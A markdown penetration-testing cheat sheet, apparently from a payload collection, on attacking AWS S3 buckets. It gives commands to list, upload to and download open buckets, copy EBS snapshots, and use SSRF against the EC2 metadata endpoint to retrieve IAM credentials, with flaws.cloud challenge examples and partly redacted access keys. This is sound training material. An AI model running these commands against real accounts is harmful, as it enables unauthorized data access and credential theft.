# Amazon Bucket S3 AWS

## Summary

- [Tools](#tools)
- [AWS Configuration](#aws-configuration)
- [Open Bucket](#open-bucket)
- [Basic tests](#basic-tests)
	- [Listing files](#listing-files)
	- [Move a file into the bucket](move-a-file-into-the-bucket)
	- [Download every things](#download-every-things)
	- [Check bucket disk size](#check-bucket-disk-size)
- [AWS - Extract Backup](#aws---extract-backup)
- [Bucket juicy data](#bucket-juicy-data)

## Tools

- [Pacu - The AWS exploitation framework, designed for testing the security of Amazon Web Services environments](https://github.com/RhinoSecurityLabs/pacu)
- [Bucket Finder - Search for readable buckets and list all the files in them](https://digi.ninja/)
	```powershell
	wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2
	./bucket_finder.rb my_words
	./bucket_finder.rb --region ie my_words
		US Standard         = http://s3.amazonaws.com
		Ireland             = http://s3-eu-west-1.amazonaws.com
		Northern California = http://s3-us-west-1.amazonaws.com
		Singapore           = http://s3-ap-southeast-1.amazonaws.com
		Tokyo               = http://s3-ap-northeast-1.amazonaws.com

	./bucket_finder.rb --download --region ie my_words
	./bucket_finder.rb --log-file bucket.out my_words
	```
- [Boto3 - Amazon Web Services (AWS) SDK for Python](https://boto3.amazonaws.com/v1/documentation/api/latest/index.html)
	```python
	import boto3
	# Create an S3 client
	s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1')

	try:
		result = s3.list_buckets()
		print(result)
	except Exception as e:
		print(e)
	```

## AWS Configuration

Prerequisites, at least you need awscli

```bash
sudo apt install awscli
```

You can get your credential here https://console.aws.amazon.com/iam/home?#/security_credential
but you need an aws account, free tier account : https://aws.amazon.com/s/dm/optimization/server-side-test/free-tier/free_np/

```javascript
aws configure
AWSAccessKeyId=[ENTER HERE YOUR KEY]
AWSSecretKey=[ENTER HERE YOUR KEY]
```

```javascript
aws configure --profile nameofprofile
```

then you can use *--profile nameofprofile* in the aws command.

Alternatively you can use environment variables instead of creating a profile.

```bash
export AWS_ACCESS_KEY_ID=ASIAZ[...]PODP56
export AWS_SECRET_ACCESS_KEY=fPk/Gya[...]4/j5bSuhDQ
export AWS_SESSION_TOKEN=FQoGZXIvYXdzE[...]8aOK4QU=
```

## Open Bucket

By default the name of Amazon Bucket are like http://s3.amazonaws.com/[bucket_name]/, you can browse open buckets if you know their names

```bash
http://s3.amazonaws.com/[bucket_name]/
http://[bucket_name].s3.amazonaws.com/
http://flaws.cloud.s3.amazonaws.com/
```

Their names are also listed if the listing is enabled.

```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
<Name>adobe-REDACTED-REDACTED-REDACTED</Name>
```

Alternatively you can extract the name of inside-site s3 bucket with `%C0`. (Trick from https://twitter.com/0xmdv/status/1065581916437585920)

```xml
http://example.com/resources/id%C0

eg: http://redacted/avatar/123%C0
```

## Basic tests

### Listing files

```bash
aws s3 ls s3://targetbucket --no-sign-request --region insert-region-here
aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
```

You can get the region with a dig and nslookup

```bash
$ dig flaws.cloud
;; ANSWER SECTION:
flaws.cloud.    5    IN    A    52.218.192.11

$ nslookup 52.218.192.11
Non-authoritative answer:
11.192.218.52.in-addr.arpa name = s3-website-us-west-2.amazonaws.com.
```

### Move a file into the bucket

```bash
aws s3 cp local.txt s3://some-bucket/remote.txt --acl authenticated-read
aws s3 cp login.html s3://$bucketName --grants read=uri=http://acs.amazonaws.com/groups/global/AllUsers
```

```bash
aws s3 mv test.txt s3://hackerone.marketing
FAIL : "move failed: ./test.txt to s3://hackerone.marketing/test.txt A client error (AccessDenied) occurred when calling the PutObject operation: Access Denied."

aws s3 mv test.txt s3://hackerone.files
SUCCESS : "move: ./test.txt to s3://hackerone.files/test.txt"
```

### Download every things

```powershell
aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
```

### Check bucket disk size

Use `--no-sign` for un-authenticated check.

```powershell
aws s3 ls s3://<bucketname> --recursive  | grep -v -E "(Bucket: |Prefix: |LastWriteTime|^$|--)" | awk 'BEGIN {total=0}{total+=$3}END{print total/1024/1024" MB"}'
```

## AWS - Extract Backup

```powershell
aws --profile flaws sts get-caller-identity
"Account": "XXXX26262029",

aws --profile flaws  ec2 describe-snapshots --owner-id XXXX26262029 --region us-west-2    
"SnapshotId": "snap-XXXX342abd1bdcb89",

Create a volume using snapshot
aws --profile swk ec2 create-volume --availability-zone us-west-2a --region us-west-2  --snapshot-id  snap-XXXX342abd1bdcb89
In Aws Console -> EC2 -> New Ubuntu
chmod 400 YOUR_KEY.pem
ssh -i YOUR_KEY.pem  ubuntu@ec2-XXX-XXX-XXX-XXX.us-east-2.compute.amazonaws.com

Mount the volume
lsblk
sudo file -s /dev/xvda1
sudo mount /dev/xvda1 /mnt
```

## Bucket juicy data

Amazon exposes an internal service every EC2 instance can query for instance metadata about the host. If you found an SSRF vulnerability that runs on EC2, try requesting :

```powershell
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
```

For example with a proxy : http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws/



## References

* [There's a Hole in 1,951 Amazon S3 Buckets - Mar 27, 2013 - Rapid7 willis](https://community.rapid7.com/community/infosec/blog/2013/03/27/1951-open-s3-buckets)
* [Bug Bounty Survey - AWS Basic test](https://twitter.com/bugbsurveys/status/859389553211297792)
* [flaws.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route](http://flaws.cloud/)
* [flaws2.cloud Challenge based on AWS vulnerabilities - by Scott Piper of Summit Route](http://flaws2.cloud)
* [Guardzilla video camera hardcoded AWS credential - 0dayallday.org](https://www.0dayallday.org/guardzilla-video-camera-hard-coded-aws-credentials/)
* [AWS PENETRATION TESTING PART 1. S3 BUCKETS - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-1-s3-buckets/)
* [AWS PENETRATION TESTING PART 2. S3, IAM, EC2 - VirtueSecurity](https://www.virtuesecurity.com/aws-penetration-testing-part-2-s3-iam-ec2/)